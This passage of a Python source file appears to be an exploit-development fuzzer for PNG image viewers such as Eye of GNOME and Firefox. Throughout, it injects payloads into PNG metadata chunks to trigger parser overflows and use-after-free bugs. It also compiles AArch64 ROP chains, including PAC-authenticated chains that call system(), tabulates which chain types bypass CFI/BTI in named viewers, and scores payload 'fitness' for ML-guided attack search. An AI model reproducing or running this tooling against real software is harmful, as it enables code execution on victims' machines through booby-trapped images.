    Saves the fuzzing results to a CSV file for historical data and ML training.
    Appends to existing file instead of overwriting to preserve trajectory history.
    
    Args:
        results: List of result dictionaries from fuzzing.
        output_dir: Directory to save the CSV file.
    """
    if not results:
        logger.warning("No results to save to trajectory database.")
        return
    
    csv_path = os.path.join(output_dir, "fuzzing_trajectory.csv")
    
    # Define CSV columns based on result keys
    fieldnames = [
        "timestamp", "original_file", "viewer", "fuzz_type", "payload_offset_attempted",
        "trigger_offset_attempted", "status", "reason", "retry_attempt", "payload_validated",
        "platform", "fitting_payload_addr", "fitting_offsets", "success_label", "confidence_score"
    ]
    
    try:
        # Check if file exists to determine if we need to write header
        file_exists = os.path.exists(csv_path)
        
        # CRITICAL FIX: Use 'a' (append) mode instead of 'w' (write/truncate) to preserve history
        with open(csv_path, 'a', newline='') as csvfile:
            writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
            
            # Only write header if file is new
            if not file_exists:
                writer.writeheader()
            
            for result in results:
                # Map result keys to CSV fields, with defaults for missing keys
                row = {
                    "timestamp": result.get("timestamp", ""),
                    "original_file": result.get("file", ""),
                    "viewer": result.get("viewer", ""),
                    "fuzz_type": result.get("fuzz_type", ""),
                    "payload_offset_attempted": result.get("payload_offset_attempted", 0),
                    "trigger_offset_attempted": result.get("trigger_offset_attempted", 0),
                    "status": result.get("status", ""),
                    "reason": result.get("reason", ""),
                    "retry_attempt": result.get("retry_attempt", 0),
                    "payload_validated": result.get("payload_validated", False),
                    "platform": result.get("platform", ""),
                    "fitting_payload_addr": result.get("fitting_payload_addr", ""),
                    "fitting_offsets": "; ".join(result.get("fitting_offsets", [])) if result.get("fitting_offsets") else "",
                    "success_label": 1 if result.get("payload_validated") else 0,
                    "confidence_score": result.get("confidence_score", 0.0)
                }
                writer.writerow(row)
        
        logger.info(f"Appended {len(results)} results to {csv_path}")
    
    except Exception as e:
        logger.error(f"Failed to save trajectory database to {csv_path}: {e}")
        import traceback
        logger.error(traceback.format_exc())

def inject_metadata_trigger(file_path: str, payload: Union[str, bytes]) -> bool:
    """
    Injects payload into PNG metadata chunks to trigger metadata parsing vulnerabilities.
    
    This targets viewers that parse metadata (e.g., eog's metadata reader) by injecting
    malicious data into tEXt, iTXt, or other metadata chunks. The payload is embedded
    in a way that may cause buffer overflows or other issues during metadata processing.
    
    Args:
        file_path: Path to the PNG file to modify.
        payload: The payload string or bytes to inject.
    
    Returns:
        True if injection succeeds, False otherwise.
    """
    try:
        orig_payload = payload
        if isinstance(orig_payload, str):
            orig_payload = orig_payload.encode()
        
        with open(file_path, 'rb') as f:
            content = bytearray(f.read())
        
        iend_index = content.find(IEND_CHUNK)
        if iend_index == -1:
            return False
        iend_start = iend_index - 4
        
        # Inject multiple metadata chunks to increase trigger chances
        metadata_chunks = [
            ("Title", orig_payload),  # tEXt chunk for title
            ("Author", b"A" * 100 + orig_payload),  # tEXt with padding
            ("Description", orig_payload + b"\x00" * 50),  # tEXt with null bytes
            ("Comment", b"Metadata trigger: " + orig_payload),  # tEXt comment
            ("INJECTED_PAYLOAD", orig_payload),  # tEXt chunk for instrumentation payload execution
        ]
        
        for key, data in metadata_chunks:
            # Create tEXt chunk: length + "tEXt" + key + "\x00" + data + CRC
            key_bytes = key.encode() + b"\x00"
            chunk_data = key_bytes + data
            chunk_length = len(chunk_data).to_bytes(4, 'big')
            chunk_type = b"tEXt"
            crc = calculate_png_crc(chunk_type, chunk_data)
            chunk = chunk_length + chunk_type + chunk_data + crc
            
            # Insert before IEND
            content[iend_start:iend_start] = chunk
            iend_index = content.find(IEND_CHUNK)
            iend_start = iend_index - 4
        
        # Also inject an iTXt chunk for international text (more complex metadata)
        itxt_key = b"XML:com.adobe.xmp"
        itxt_data = b'<?xpacket begin="" id="W5M0MpCehiHzreSzNTczkc9d"?>\n' + orig_payload + b'\n<?xpacket end="w"?>\n'
        itxt_chunk_data = itxt_key + b"\x00" + b"\x00" + b"\x00" + b"\x00" + itxt_data  # Compression flag, method, language, translated keyword
        itxt_length = len(itxt_chunk_data).to_bytes(4, 'big')
        itxt_type = b"iTXt"
        itxt_crc = calculate_png_crc(itxt_type, itxt_chunk_data)
        itxt_chunk = itxt_length + itxt_type + itxt_chunk_data + itxt_crc
        
        content[iend_start:iend_start] = itxt_chunk
        iend_index = content.find(IEND_CHUNK)
        iend_start = iend_index - 4
        
        # Update IDAT CRC if necessary
        content = find_and_update_chunk_crc(content, b'IDAT')
        
        with open(file_path, 'wb') as f:
            f.write(content)
        
        logger.info(f"Metadata trigger injection successful for {file_path}")
        return True
    
    except Exception as e:
        logger.error(f"Metadata trigger injection failed: {e}")
        import traceback
        logger.error(traceback.format_exc())
        return False
    
def compile_rop_chain_pac_aware(arch: str, gadgets: List[Dict], payload_addr: int,
                                leaks: Dict = None, chain_base_addr: Optional[int] = None,
                                pac_enabled: bool = True) -> bytes:
    """
    Compiles a PAC-aware ROP chain for AArch64.
    
    Strategy:
    1. If PAC enabled: Use LDRAA (authenticated load) + BLRAAZ (authenticated branch)
    2. Otherwise: Fall back to standard ROP
    """
    if arch != "aarch64":
        logger.warning(f"PAC-aware ROP only supported on AArch64, got {arch}")
        return b""
    
    leaks = leaks or {}
    system_addr = leaks.get("system", 0)
    payload_address = payload_addr
    
    if not system_addr:
        logger.warning("System address not leaked, cannot compile PAC-aware ROP chain")
        return b""
    
    if pac_enabled:
        # PAC-aware gadget chain
        # 1. Load authenticated system pointer
        ldraa_gadget = leaks.get("gadget_ldraa_x0_x1_br_x0", 0)
        # 2. Authenticate and branch
        blraaz_gadget = leaks.get("gadget_blraaz_x0", 0)
        
        if not (ldraa_gadget and blraaz_gadget):
            logger.warning("PAC-aware gadgets not found in leaks. Falling back to standard ROP.")
            # Fall back to standard ROP chain
            pop_x0_x1_x2 = leaks.get("pop_x0_x1_x2_ret", 0)
            if pop_x0_x1_x2:
                rop_chain = (
                    pop_x0_x1_x2.to_bytes(8, 'little') +
                    payload_address.to_bytes(8, 'little') +
                    b"\x00" * 8 +
                    system_addr.to_bytes(8, 'little')
                )
                logger.info("Generated standard (non-PAC) ROP chain as fallback")
                return rop_chain
            return b""
        
        # ROP chain with PAC-aware gadgets:
        # Pop values into x0, x1 for LDRAA
        # x1 = address of authenticated system pointer
        # x0 = [x1] via LDRAA (authenticated)
        # BLRAAZ x0 (authenticate before branch)
        
        rop_chain = b""
        
        # 1. Prepare x1 to point to authenticated system address
        pop_x0_x1_gadget = leaks.get("pop_x0_x1_x2_ret", 0)
        if pop_x0_x1_gadget:
            rop_chain += pop_x0_x1_gadget.to_bytes(8, 'little')
            rop_chain += payload_address.to_bytes(8, 'little')  # x0 = payload
            rop_chain += system_addr.to_bytes(8, 'little')      # x1 = system
            rop_chain += b"\x00" * 8                             # x2 (padding)
        
        # 2. Load and authenticate
        rop_chain += ldraa_gadget.to_bytes(8, 'little')
        
        # 3. Authenticate and branch
        rop_chain += blraaz_gadget.to_bytes(8, 'little')
        
        logger.info("Generated PAC-aware ROP chain with LDRAA + BLRAAZ")
        return rop_chain
    else:
        # Standard ROP (no PAC)
        pop_x0_x1_x2 = leaks.get("pop_x0_x1_x2_ret", 0)
        
        if system_addr and pop_x0_x1_x2:
            rop_chain = (
                pop_x0_x1_x2.to_bytes(8, 'little') +
                payload_address.to_bytes(8, 'little') +
                b"\x00" * 8 +
                system_addr.to_bytes(8, 'little')
            )
            logger.info("Generated standard (non-PAC) ROP chain")
            return rop_chain
    
    return b""


# ==================== INSTRUMENTATION VALIDATION & ENHANCEMENT FUNCTIONS ====================

def validate_instrumentation_embedding(file_path: str, fuzz_type: str = "default") -> Dict:
    """Validate that instrumentation markers are correctly embedded in a PNG file.
    
    Args:
        file_path: Path to the PNG file to validate.
        fuzz_type: Type of fuzzing applied to the file.
    
    Returns:
        Dictionary with validation results and detected instrumentation markers.
    """
    """
    Inspects PNG file for wrongful embeddings and instrumentation validation.
    Detects misplaced tags, orphaned chains, and instrumentation integrity issues.
    
    Returns a dict with validation results:
    - "valid": bool - Overall validity
    - "issues": List[str] - Issues found
    - "embeddings": Dict - Tagged embeddings found with their offsets
    - "missing_triggers": List[str] - Expected triggers that are missing
    - "payload_integrity": bool - Whether payload appears intact
    """
    validation_result = {
        "valid": True,
        "issues": [],
        "warnings": [],
        "embeddings": {},
        "missing_triggers": [],
        "payload_integrity": True,
        "doubtful_fitness_markers": []
    }
    
    try:
        with open(file_path, 'rb') as f:
            content = f.read()
        
        # Check for FITNESS_OK in wrong locations
        fitness_ok_positions = []
        idx = 0
        while True:
            idx = content.find(b"FITNESS_OK", idx)
            if idx == -1:
                break
            fitness_ok_positions.append(idx)
            idx += 1
        
        # FITNESS_OK can appear multiple times during heap spray (recoverable warning)
        if len(fitness_ok_positions) > 1:
            validation_result["warnings"].append(f"Multiple FITNESS_OK markers found ({len(fitness_ok_positions)}), expected during heap spray - keeping last occurrence only")
            validation_result["doubtful_fitness_markers"].extend(fitness_ok_positions[:-1])
            
            # Deduplicate: remove all FITNESS_OK except the last occurrence
            for pos in sorted(fitness_ok_positions[:-1], reverse=True):
                # Find the boundary of the FITNESS_OK marker (including null terminator if present)
                end_pos = pos + len(b"FITNESS_OK")
                # Check if followed by null terminator or newline
                if end_pos < len(content) and content[end_pos:end_pos+1] in [b'\x00', b'\n']:
                    end_pos += 1
                # Remove this marker
                content = content[:pos] + content[end_pos:]
        
        # Check for chain embeddings
        chain_types = {
            b"ROP_": "ROP chain",
            b"JOP_": "JOP chain",
            b"VOP_": "VOP chain",
            b"DOP_": "DOP chain",
            b"PAC_ROP": "PAC-ROP chain",
        }
        
        for chain_marker, chain_name in chain_types.items():
            if chain_marker in content:
                pos = content.find(chain_marker)
                validation_result["embeddings"][chain_name] = pos
                logger.debug(f"Found {chain_name} at offset {pos}")
        
        # Verify IEND chunk is still valid
        iend_pos = content.find(IEND_CHUNK)
        if iend_pos == -1:
            validation_result["issues"].append("IEND chunk not found or corrupted")
            validation_result["valid"] = False
            validation_result["payload_integrity"] = False
        else:
            # IEND should be near end but allow some margin for tEXt chunks
            if iend_pos < len(content) - 1000:
                validation_result["issues"].append("IEND chunk position unusual, possible corruption")
                validation_result["valid"] = False
        
        # For optimization_bypass and uaf, payload must be properly wrapped
        if fuzz_type in ["optimization_bypass", "uaf"]:
            if b"INJECTED_PAYLOAD" not in content:
                validation_result["missing_triggers"].append("INJECTED_PAYLOAD marker missing")
                validation_result["valid"] = False
            
            # Check for vtable object structure (should be 72 bytes: 64 cmd + 8 vtable)
            if fuzz_type == "optimization_bypass":
                if b"PAC_ROP" not in content and b"ROP_" not in content:
                    validation_result["missing_triggers"].append("No ROP/PAC-ROP chains found for optimization_bypass")
                    validation_result["valid"] = False
        
        logger.info(f"Instrumentation validation: {'PASS' if validation_result['valid'] else 'FAIL'}")
        if validation_result["issues"]:
            for issue in validation_result["issues"]:
                logger.warning(f"  - {issue}")
        
        return validation_result
    
    except Exception as e:
        logger.error(f"Instrumentation validation error: {e}")
        validation_result["valid"] = False
        validation_result["issues"].append(str(e))
        return validation_result


def analyze_trigger_payload_alignment(file_path: str, fuzz_type: str, trigger_offset: int = 0) -> Dict:
    """Analyze payload trigger-to-execution alignment in a PNG file.
    
    Args:
        file_path: Path to the PNG file to analyze.
        fuzz_type: Type of fuzzing (e.g., 'overflow', 'uaf', 'metadata_trigger').
        trigger_offset: How far the payload was slid from its original position.
    
    Returns:
        Dictionary with alignment analysis including quality rating and recommendations.
    """
    """
    Analyzes payload trigger-to-execution alignment.
    Ensures trigger can properly reach payload in memory.
    
    Returns analysis dict:
    - "aligned": bool - Whether trigger and payload are properly aligned
    - "trigger_offset": int - Where trigger starts
    - "payload_offset": int - Where payload starts
    - "gap_bytes": int - Distance between trigger and payload
    - "alignment_quality": str - "perfect", "good", "acceptable", "poor"
    - "recommendations": List[str] - Suggestions for improvement
    """
    analysis = {
        "aligned": False,
        "trigger_offset": -1,
        "payload_offset": -1,
        "gap_bytes": -1,
        "alignment_quality": "unknown",
        "recommendations": [],
        "trigger_type": None,
        "payload_slide": trigger_offset,  # How far payload was slid
    }
    
    try:
        with open(file_path, 'rb') as f:
            content = f.read()
        
        # Find trigger markers based on fuzz_type
        trigger_markers = {
            "overflow": b"ovfW",
            "uaf": b"UAF_Spray",
            "double_free": b"DF_Mark",
            "metadata_trigger": b"mtEXt",
            "optimization_bypass": b"ROP_",  # Trigger is ROP chain itself
        }
        
        payload_marker = b"INJECTED_PAYLOAD"
        
        trigger_pos = -1
        gap = -1  # Initialize gap to -1 (invalid/not found)
        trigger_marker = trigger_markers.get(fuzz_type, None)
        payload_pos = content.find(payload_marker)

        if trigger_marker and trigger_marker in content:
            trigger_pos = content.find(trigger_marker)
            analysis["trigger_type"] = fuzz_type
        elif b"TriggerPayload" in content:
            trigger_pos = content.find(b"TriggerPayload")
            analysis["trigger_type"] = "TriggerPayload"
        elif b"tEXt" in content:
            trigger_pos = content.find(b"tEXt")
            analysis["trigger_type"] = "tEXt_fallback"
        
        if trigger_pos >= 0 and payload_pos >= 0:
            gap = payload_pos - trigger_pos
            analysis["trigger_offset"] = trigger_pos
            analysis["payload_offset"] = payload_pos
            analysis["gap_bytes"] = gap
            
            # Alignment quality assessment
            # Perfect: trigger and payload adjacent (minimal gap)
            # Good: trigger can reach payload in 1-2 cache lines
            # Acceptable: within same page (4KB)
            # Poor: across pages
            
            if gap < 64:  # Adjacent or very close
                analysis["alignment_quality"] = "perfect"
                analysis["aligned"] = True
            elif gap < 512:  # Within L1/L2 cache line
                analysis["alignment_quality"] = "good"
                analysis["aligned"] = True
            elif gap < 4096:  # Within page
                analysis["alignment_quality"] = "acceptable"
                analysis["aligned"] = True
            else:  # Across pages
                analysis["alignment_quality"] = "poor"
                analysis["aligned"] = False
                analysis["recommendations"].append(f"Trigger-payload gap is {gap} bytes; consider reducing by {gap-4096}")
        
        # Check payload slide value
        if trigger_offset > 0:
            if trigger_offset > 1024:
                analysis["recommendations"].append(f"Payload slide of {trigger_offset} bytes may be excessive; try < 256")
            elif trigger_offset < 8:
                analysis["recommendations"].append(f"Payload slide of {trigger_offset} bytes may be too small for proper fuzzing")
        
        logger.info(f"Trigger-payload alignment: {analysis['alignment_quality']} (gap={analysis['gap_bytes']} bytes)")
        
        return analysis
    
    except Exception as e:
        logger.error(f"Alignment analysis error: {e}")
        analysis["recommendations"].append(f"Error during analysis: {str(e)}")
        return analysis


def detect_cfi_bti_mitigations(viewer_name: str, crash_log: Optional[str] = None) -> Dict:
    """Detect CFI (Control Flow Integrity) and BTI (Branch Target Identification) mitigations.
    
    Args:
        viewer_name: Name of the viewer being analyzed (e.g., 'firefox', 'eog', 'png_consumer').
        crash_log: Optional crash log output to analyze for mitigation signatures.
    
    Returns:
        Dictionary with mitigation detection results and recommended chain types.
    """
    """
    Detects CFI (Control Flow Integrity) and BTI (Branch Target Identification) mitigations.
    Tracks when payloads reach execution but are blocked by mitigations.
    
    Returns detection dict:
    - "cfi_enabled": bool - CFI/PAC appears enabled
    - "bti_enabled": bool - BTI appears enabled
    - "mitigation_state": str - "not_detected", "likely", "confirmed"
    - "bypass_chains": Dict - Which chain types work vs blocked
    - "indicators": List[str] - Evidence found in crash logs
    - "recommended_chains": List[str] - Which chains to use
    """
    mitigation_info = {
        "cfi_enabled": False,
        "bti_enabled": False,
        "mitigation_state": "not_detected",
        "bypass_chains": {
            "ROP": "unknown",  # blocked, works, unknown
            "JOP": "unknown",
            "VOP": "unknown",
            "DOP": "unknown",
            "PAC_ROP": "unknown",
            "PAC_DOP": "unknown",
        },
        "indicators": [],
        "recommended_chains": [],
        "execution_reached": False,  # Payload execution reached but blocked
    }
    
    try:
        # Check viewer-specific known mitigations
        viewer_mitigations = {
            "firefox": {
                "cfi": True,
                "bti": True,
                "name": "Firefox (strong mitigations)",
                "rop": "blocked",
                "jop": "blocked",
                "vop": "works",
                "dop": "works",
                "pac_rop": "works",
                "pac_dop": "works"
            },
            "eog": {
                "cfi": False,
                "bti": False,
                "name": "Eye of GNOME (minimal mitigations)",
                "rop": "works",
                "jop": "blocked",
                "vop": "works",
                "dop": "works"
            },
            "png_consumer": {
                "cfi": False,
                "bti": False,
                "name": "png_consumer (test binary)",
                "rop": "works",
                "jop": "blocked"
            },
        }
        
        if viewer_name in viewer_mitigations:
            vm = viewer_mitigations[viewer_name]
            mitigation_info["cfi_enabled"] = vm["cfi"]
            mitigation_info["bti_enabled"] = vm["bti"]
            mitigation_info["indicators"].append(f"{vm['name']}")
            for chain_key in mitigation_info["bypass_chains"]:
                status_key = chain_key.lower() if chain_key != "PAC_DOP" else "pac_dop"
                if status_key in vm:
                    mitigation_info["bypass_chains"][chain_key] = vm[status_key]
        
        # Analyze crash log for mitigation indicators
        if crash_log:
            indicators = {
                "SIGILL": ("CFI violation detected", "CFI"),
                "invalid_abi_tag": ("ABI tag failure (BTI)", "BTI"),
                "PAC failure": ("PAC authentication failure", "CFI"),
                "indirect branch": ("Indirect branch blocked", "CFI/BTI"),
            }
            
            for pattern, (msg, mit_type) in indicators.items():
                if pattern.lower() in crash_log.lower():
                    mitigation_info["indicators"].append(msg)
                    mitigation_info["execution_reached"] = True
                    if "CFI" in mit_type:
                        mitigation_info["cfi_enabled"] = True
                    if "BTI" in mit_type:
                        mitigation_info["bti_enabled"] = True
        
        # Determine mitigation state
        if mitigation_info["cfi_enabled"] or mitigation_info["bti_enabled"]:
            mitigation_info["mitigation_state"] = "likely"
            if mitigation_info["execution_reached"]:
                mitigation_info["mitigation_state"] = "confirmed"
        
        # Recommend chains based on detected mitigations
        if viewer_name == "eog":
            mitigation_info["recommended_chains"] = ["ROP", "VOP", "DOP"]
            mitigation_info["bypass_chains"]["JOP"] = "blocked"
            mitigation_info["bypass_chains"]["ROP"] = "works"
            mitigation_info["bypass_chains"]["VOP"] = "works"
            mitigation_info["bypass_chains"]["DOP"] = "works"
        elif viewer_name == "firefox":
            mitigation_info["recommended_chains"] = ["PAC_DOP", "VOP", "DOP", "PAC_ROP"]
            mitigation_info["bypass_chains"]["ROP"] = "blocked"
            mitigation_info["bypass_chains"]["JOP"] = "blocked"
            mitigation_info["bypass_chains"]["VOP"] = "works"
            mitigation_info["bypass_chains"]["DOP"] = "works"
            mitigation_info["bypass_chains"]["PAC_ROP"] = "works"
            mitigation_info["bypass_chains"]["PAC_DOP"] = "works"
        elif viewer_name == "png_consumer":
            mitigation_info["recommended_chains"] = ["ROP"]
            mitigation_info["bypass_chains"]["ROP"] = "works"
            mitigation_info["bypass_chains"]["JOP"] = "blocked"
        elif mitigation_info["cfi_enabled"]:
            mitigation_info["bypass_chains"]["ROP"] = "blocked"
            mitigation_info["bypass_chains"]["JOP"] = "blocked"
            mitigation_info["bypass_chains"]["PAC_ROP"] = "works"
            mitigation_info["recommended_chains"] = ["PAC_ROP", "VOP", "DOP"]
        else:
            mitigation_info["bypass_chains"]["ROP"] = "works"
            mitigation_info["recommended_chains"] = ["ROP", "JOP"]

        if mitigation_info["bti_enabled"]:
            mitigation_info["bypass_chains"]["VOP"] = "works"
            mitigation_info["bypass_chains"]["DOP"] = "works"
            if not mitigation_info["recommended_chains"]:
                mitigation_info["recommended_chains"] = ["VOP", "DOP"]
        
        logger.info(f"Mitigation detection for {viewer_name}: {mitigation_info['mitigation_state']}")
        if mitigation_info["indicators"]:
            logger.info(f"  Indicators: {', '.join(mitigation_info['indicators'])}")
        
        return mitigation_info
    
    except Exception as e:
        logger.error(f"Mitigation detection error: {e}")
        return mitigation_info


def compute_enhanced_fitness_score(fuzz_type: str, chain_type: str, payload_size: int, 
                                   trigger_alignment: Dict, mitigation_info: Dict, 
                                   execution_confirmed: bool = False) -> Dict:
    """Compute enhanced fitness score for a payload configuration.
    
    Args:
        fuzz_type: Type of fuzzing (e.g., 'overflow', 'uaf', 'metadata_trigger').
        chain_type: Type of exploit chain (e.g., 'ROP', 'JOP', 'VOP', 'DOP', 'PAC_ROP').
        payload_size: Size of the payload in bytes.
        trigger_alignment: Alignment analysis from analyze_trigger_payload_alignment().
        mitigation_info: Mitigation detection from detect_cfi_bti_mitigations().
        execution_confirmed: Whether payload execution has been confirmed.
    
    Returns:
        Dictionary with overall fitness score (0.0-1.0) and component breakdown.
    """
    """
    Computes enhanced fitness score for payload configuration.
    Combines multiple factors: chain type, payload size, alignment, mitigations, execution.
    
    Returns fitness dict:
    - "overall_score": float - 0.0-1.0, higher is better
    - "component_scores": Dict - Individual scores for each factor
    - "fitness_category": str - "excellent", "good", "fair", "poor", "failed"
    - "bottlenecks": List[str] - What's limiting fitness
    - "suggested_improvements": List[str] - How to improve
    """
    fitness = {
        "overall_score": 0.5,
        "component_scores": {},
        "fitness_category": "fair",
        "bottlenecks": [],
        "suggested_improvements": [],
        "payload_size_score": 0.0,
        "alignment_score": 0.0,
        "mitigation_bypass_score": 0.0,
        "execution_score": 0.0,
    }
    
    try:
        # 1. Payload size fitness (should be 32-256 bytes for optimal fuzzing)
        if payload_size < 32:
            fitness["payload_size_score"] = min(payload_size / 32, 1.0) * 0.5
            fitness["bottlenecks"].append("Payload too small (< 32 bytes)")
        elif payload_size <= 256:
            fitness["payload_size_score"] = 1.0
        elif payload_size <= 512:
            fitness["payload_size_score"] = 0.8
        else:
            fitness["payload_size_score"] = max(0.3, 1.0 - (payload_size - 512) / 2048)
            fitness["bottlenecks"].append(f"Payload large ({payload_size} bytes), may slow fuzzing")
        
        fitness["component_scores"]["payload_size"] = fitness["payload_size_score"]
        
        # 2. Trigger-payload alignment fitness
        if trigger_alignment.get("aligned"):
            alignment_quality = trigger_alignment.get("alignment_quality", "unknown")
            alignment_scores = {"perfect": 1.0, "good": 0.9, "acceptable": 0.7, "poor": 0.4}
            fitness["alignment_score"] = alignment_scores.get(alignment_quality, 0.5)
        else:
            fitness["alignment_score"] = 0.3
            fitness["bottlenecks"].append(f"Poor trigger-payload alignment ({trigger_alignment.get('gap_bytes')} byte gap)")
        
        fitness["component_scores"]["alignment"] = fitness["alignment_score"]
        
        # 3. Mitigation bypass fitness (based on chain type and mitigations)
        cfi_enabled = mitigation_info.get("cfi_enabled", False)
        bti_enabled = mitigation_info.get("bti_enabled", False)
        
        chain_mitigation_matrix = {
            "ROP": {"no_mit": 1.0, "cfi": 0.2, "bti": 0.8},
            "JOP": {"no_mit": 1.0, "cfi": 0.3, "bti": 0.8},
            "PAC_ROP": {"no_mit": 0.9, "cfi": 0.95, "bti": 0.95},
            "VOP": {"no_mit": 0.8, "cfi": 0.7, "bti": 0.85},
            "DOP": {"no_mit": 0.8, "cfi": 0.7, "bti": 0.85},
            "PAC_DOP": {"no_mit": 0.85, "cfi": 0.92, "bti": 0.95},
        }
        
        mit_key = "no_mit"
        if cfi_enabled and bti_enabled:
            mit_key = "cfi"  # Worst case
        elif cfi_enabled:
            mit_key = "cfi"
        elif bti_enabled:
            mit_key = "bti"
        
        chain_scores = chain_mitigation_matrix.get(chain_type, {"no_mit": 0.5, "cfi": 0.5, "bti": 0.5})
        fitness["mitigation_bypass_score"] = chain_scores.get(mit_key, 0.5)
        
        fitness["component_scores"]["mitigation_bypass"] = fitness["mitigation_bypass_score"]
        
        # 4. Execution confirmation fitness
        if execution_confirmed:
            fitness["execution_score"] = 1.0
        else:
            fitness["execution_score"] = 0.6
        
        fitness["component_scores"]["execution"] = fitness["execution_score"]
        
        # Calculate overall score (weighted average)
        weights = {
            "payload_size": 0.20,
            "alignment": 0.25,
            "mitigation_bypass": 0.35,
            "execution": 0.20,
        }
        
        fitness["overall_score"] = (
            fitness["payload_size_score"] * weights["payload_size"] +
            fitness["alignment_score"] * weights["alignment"] +
            fitness["mitigation_bypass_score"] * weights["mitigation_bypass"] +
            fitness["execution_score"] * weights["execution"]
        )
        
        # Categorize fitness
        if fitness["overall_score"] >= 0.85:
            fitness["fitness_category"] = "excellent"
        elif fitness["overall_score"] >= 0.70:
            fitness["fitness_category"] = "good"
        elif fitness["overall_score"] >= 0.50:
            fitness["fitness_category"] = "fair"
        else:
            fitness["fitness_category"] = "poor"
        
        # Generate suggestions
        if not execution_confirmed:
            fitness["suggested_improvements"].append("Payload execution not confirmed; verify trigger sequence")
        
        if fitness["alignment_score"] < 0.7:
            fitness["suggested_improvements"].append("Improve trigger-payload alignment (reduce gap)")
        
        if fitness["mitigation_bypass_score"] < 0.6:
            cfi_str = "CFI" if cfi_enabled else ""
            bti_str = "BTI" if bti_enabled else ""
            mitigations = f"{cfi_str} {bti_str}".strip()
            fitness["suggested_improvements"].append(f"Chain type ineffective against {mitigations}; try {', '.join(mitigation_info.get('recommended_chains', []))}")
        
        logger.info(f"Fitness score: {fitness['overall_score']:.2f} ({fitness['fitness_category']})")
        
        return fitness
    
    except Exception as e:
        logger.error(f"Fitness computation error: {e}")
        return fitness


# PNG Chunk Structure Coverage System
# ====================================

class PNGChunkTarget:
    """Defines different PNG structures for comprehensive fuzzing coverage."""
    
    # Basic ancillary chunks
    TEXT = "tEXt"           # Text metadata
    ZTXT = "zTXt"           # Compressed text
    ITXT = "iTXt"           # International text
    
    # Thumbnail metadata
    THUMB = "tHUm"          # Thumbnail (private chunk)
    TNVX = "tNVX"           # Thumbnail info
    
    # Animation metadata
    ACTL = "acTL"           # Animation control
    FCTL = "fcTL"           # Frame control
    FDAT = "fdAT"           # Frame data
    
    # EXIF and other metadata
    EXIF = "eXIf"           # EXIF data
    IMET = "iMet"           # Image metadata
    OFFS = "oFFs"           # Image offset
    
    # Gamma and color
    GAMA = "gAMA"           # Gamma
    CHRM = "cHRM"           # Chromaticity
    
    ALL = [TEXT, ZTXT, ITXT, THUMB, TNVX, ACTL, FCTL, FDAT, EXIF, IMET, OFFS, GAMA, CHRM]


def _find_png_chunk_offset(content: bytearray, chunk_type: bytes) -> Optional[int]:
    """Find the byte offset of a PNG chunk by type."""
    offset = 8
    while offset + 12 <= len(content):
        length = int.from_bytes(content[offset:offset + 4], 'big')
        current_type = content[offset + 4:offset + 8]
        if current_type == chunk_type:
            return offset
        offset += 12 + length
    return None


def _insert_chunk_at_location(content: bytearray, chunk_bytes: bytes, location: str = "iend") -> bool:
    """Insert a chunk at a target PNG location (IHDR, IDAT, IEND)."""
    if location == "ihdr":
        offset = _find_png_chunk_offset(content, b"IHDR")
        if offset is None:
            return False
        ihdr_length = int.from_bytes(content[offset:offset + 4], 'big')
        insert_at = offset + 12 + ihdr_length
    elif location == "idat":
        offset = _find_png_chunk_offset(content, b"IDAT")
        if offset is None:
            return False
        insert_at = offset
    else:
        iend_offset = content.find(b"IEND")
        if iend_offset == -1:
            return False
        insert_at = iend_offset - 4

    if insert_at < 0 or insert_at > len(content):
        return False

    content[insert_at:insert_at] = chunk_bytes
    return True


def inject_payload_into_chunk_type(content: bytearray, chunk_type: bytes, payload_data: bytes,
                                   location: str = "iend") -> bool:
    """Inject payload into a specific PNG chunk type at a chosen PNG location.
    
    Args:
        content: PNG file content as bytearray.
        chunk_type: PNG chunk type (4 bytes, e.g., b"tEXt").
        payload_data: Data to inject (will be wrapped in chunk).
        location: Where to insert the chunk ("iend", "ihdr", or "idat").
    
    Returns:
        True if injection successful, False otherwise.
    """
    try:
        chunk_data = chunk_type + b"\x00" + payload_data if chunk_type in [b"tEXt", b"iTXt", b"zTXt"] else payload_data
        chunk_length = len(chunk_data).to_bytes(4, 'big')
        chunk_crc = calculate_png_crc(chunk_type, chunk_data[1:] if chunk_type in [b"tEXt", b"iTXt", b"zTXt"] else chunk_data)
        chunk = chunk_length + chunk_type + chunk_data + chunk_crc
        return _insert_chunk_at_location(content, chunk, location=location)
    except Exception as e:
        logger.debug(f"Failed to inject into {chunk_type.decode('latin-1', errors='ignore')}: {e}")
        return False


def inject_thumbnail_metadata(content: bytearray, payload: bytes, width: int = 32, height: int = 32, location: str = "iend") -> bool:
    """Inject payload into thumbnail metadata structure."""
    try:
        thumb_header = bytes([width, height, 2])
        thumb_data = b"tHUm" + b"\x00" + thumb_header + payload
        return inject_payload_into_chunk_type(content, b"tHUm", thumb_data[:32], location=location)
    except Exception as e:
        logger.debug(f"Failed to inject thumbnail metadata: {e}")
        return False


def inject_animation_metadata(content: bytearray, payload: bytes, num_frames: int = 1, location: str = "iend") -> bool:
    """Inject payload into animation control structure."""
    try:
        anim_data = num_frames.to_bytes(4, 'big') + b"\x00\x00\x00\x01" + payload[:8]
        return inject_payload_into_chunk_type(content, b"acTL", anim_data, location=location)
    except Exception as e:
        logger.debug(f"Failed to inject animation metadata: {e}")
        return False


def inject_exif_metadata(content: bytearray, payload: bytes, location: str = "iend") -> bool:
    """Inject payload into EXIF structure."""
    try:
        exif_data = b"Exif\x00\x00" + payload
        return inject_payload_into_chunk_type(content, b"eXIf", exif_data, location=location)
    except Exception as e:
        logger.debug(f"Failed to inject EXIF metadata: {e}")
        return False


def inject_gamma_data(content: bytearray, payload: bytes, location: str = "iend") -> bool:
    """Inject payload into gamma/color correction structure."""
    try:
        gamma_value = (45455).to_bytes(4, 'big')
        gamma_data = gamma_value + payload[:4]
        return inject_payload_into_chunk_type(content, b"gAMA", gamma_data, location=location)
    except Exception as e:
        logger.debug(f"Failed to inject gamma data: {e}")
        return False


def get_png_chunk_injection_strategies() -> Dict[str, callable]:
    """Return mapping of chunk-structure strategies to injection functions."""
    return {
        "text_iend": lambda c, p: inject_payload_into_chunk_type(c, b"tEXt", b"Text\x00" + p, location="iend"),
        "text_ihdr": lambda c, p: inject_payload_into_chunk_type(c, b"tEXt", b"Text\x00" + p, location="ihdr"),
        "text_idat": lambda c, p: inject_payload_into_chunk_type(c, b"tEXt", b"Text\x00" + p, location="idat"),
        "compressed_iend": lambda c, p: inject_payload_into_chunk_type(c, b"zTXt", b"\x00\x00" + p, location="iend"),
